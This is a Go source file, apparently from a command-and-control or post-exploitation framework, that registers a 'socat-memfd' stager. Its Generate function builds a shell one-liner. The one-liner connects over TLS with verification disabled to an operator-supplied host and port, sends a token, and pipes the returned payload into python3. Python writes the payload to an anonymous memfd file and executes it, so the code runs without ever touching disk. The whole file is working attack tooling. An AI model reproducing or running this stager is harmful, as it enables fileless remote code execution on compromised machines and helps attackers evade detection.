package loader

import "fmt"

type socatMemfd struct{}

func init() { Register(&socatMemfd{}) }

func (s *socatMemfd) Name() string        { return "socat-memfd" }
func (s *socatMemfd) Description() string { return "socat + memfd_create (fileless execution)" }
func (s *socatMemfd) RequiresTool() string { return "socat,python3" }

func (s *socatMemfd) Supports(os, arch string) bool {
	return os == "linux" || os == "unknown"
}

func (s *socatMemfd) Generate(opts StagerOpts) (string, error) {
	if err := ValidateOpts(opts); err != nil {
		return "", err
	}
	return fmt.Sprintf(
		`(printf '%%s\n' '%s';sleep 1)|socat - OPENSSL:%s:%s,verify=0|python3 -c "import ctypes,os,sys;l=ctypes.CDLL(None);l.memfd_create.restype=ctypes.c_int;fd=l.memfd_create(b'',1);d=sys.stdin.buffer.read();os.write(fd,d);os.execve('/proc/self/fd/%%d'%%fd,[''],dict(os.environ))"`,
		opts.Token, opts.Host, opts.Port,
	), nil
}
